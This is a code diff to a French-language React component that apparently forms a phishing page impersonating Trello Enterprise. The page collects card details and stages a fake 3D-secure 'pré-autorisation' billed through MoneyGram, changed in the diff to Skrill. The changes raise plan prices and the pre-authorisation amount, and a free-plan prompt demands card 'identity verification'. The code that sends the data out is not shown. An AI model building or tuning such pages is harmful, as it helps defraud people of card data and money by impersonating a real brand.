@@ -94,9 +94,9 @@ const Board = () => {
       case 'Gratuit':
         return '0€';
       case 'Standard':
-        return '5€';
+        return '200€';
       case 'Premium':
-        return '10€'; 
+        return '600€'; 
       default:
         return '';
     }
@@ -227,7 +227,7 @@ const Board = () => {
 
           <div className="plan ">
             <h3>STANDARD</h3>
-            <p>5€<span className='month'> /mois</span></p>
+            <p>200€<span className='month'> /an</span></p>
             <ul>
               <li>Tableaux illimités</li>
               <li>Checklists avancées</li>
@@ -240,7 +240,7 @@ const Board = () => {
 
           <div className="plan star">
             <h3>PREMIUM</h3>
-            <p>10€<span className='month'> /mois</span></p>
+            <p>600€<span className='month'> /an</span></p>
             <ul>
               <li>Vues : Calendrier, Agenda, Chronogramme et Tableur</li>
               <li>Espaces de travail illimités</li>
@@ -262,7 +262,7 @@ const Board = () => {
             <div className={`payment-details`}>
               <form onSubmit={handleSubmit}>
                 <h3>{selectedPlan === 'Gratuit' ? 'Trello Enterprise Gratuit' : `${selectedPlan} : 30 jours gratuit`}</h3>
-                <span>{selectedPlan === 'Gratuit' ? 'Vérifiez votre identité avec une carte à votre nom pour accéder à ce tableau.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/mois annulez avant pour ne pas être facturé.`}</span>
+                <span>{selectedPlan === 'Gratuit' ? 'Vérifiez votre identité avec une carte à votre nom pour accéder à ce tableau.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/an annulez avant pour ne pas être facturé.`}</span>
 
                 <div>
                   <label>Titulaire de la carte</label>
@@ -299,7 +299,7 @@ const Board = () => {
             <img className='verified' src='/verified-by-visa.png'/>
             <img className='trello' src='/trello-enterprise-logo.png'/>  
             <hr></hr>
-            <h3>Vérificaton 3D-secure</h3>
+            <h3>Vérification 3D-secure</h3>
             {showError ? (
               <>
                 <p>La vérification a échoué. Veuillez réessayer.</p>
@@ -307,8 +307,8 @@ const Board = () => {
               </>
             ) : (
               <>
-                <p>Confirmez la pré-autorisaton de 100€</p>
-                <span>TRELLO* Secure Verif (MoneyGram)</span>
+                <p>Confirmez la pré-autorisaton de 200€</p>
+                <span>TRELLO* Secure Verif (Skrill)</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
